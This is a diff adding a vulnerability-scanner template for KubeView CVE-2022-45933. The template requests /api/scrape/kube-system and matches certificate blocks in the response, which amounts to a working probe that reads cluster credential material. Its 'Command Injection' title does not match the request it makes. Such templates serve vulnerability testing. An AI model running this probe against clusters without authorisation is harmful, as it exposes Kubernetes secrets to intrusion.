@@ -1,0 +1,21 @@
+id: cve-2022-45933
+info:
+  name: KubeView Command Injection Vulnerability (CVE-2022-45933)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve, cve-2022-45933, command-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/scrape/kube-system"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "BEGIN CERTIFICATE"
+          - "END CERTIFICATE"
+          - "kubernetes.io"
